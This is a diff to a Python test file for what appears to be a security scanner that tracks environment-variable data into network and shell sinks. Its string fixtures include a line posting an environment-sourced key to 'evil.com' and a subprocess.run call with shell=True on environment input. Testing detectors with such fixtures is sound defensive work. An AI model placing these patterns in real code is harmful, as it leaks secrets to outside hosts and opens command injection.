@@ -20,6 +20,15 @@ class TestOsGetenvSource:
             "requests.post('http://evil.com', data={'k': key})\n"
         )
         assert any("key" in f.description and "os.getenv" in f.description for f in findings)
+        assert any(f.rule_id == "DF-NET-001" for f in findings)
+
+    def test_getenv_to_subprocess_is_execution_sink(self, tmp_path):
+        findings = _analyze(tmp_path, "app.py",
+            "import os, subprocess\n"
+            "command = os.getenv('COMMAND')\n"
+            "subprocess.run(command, shell=True)\n"
+        )
+        assert any(f.rule_id == "DF-EXEC-001" for f in findings)
 
     def test_getenv_taint_propagates(self, tmp_path):
         findings = _analyze(tmp_path, "app.py",
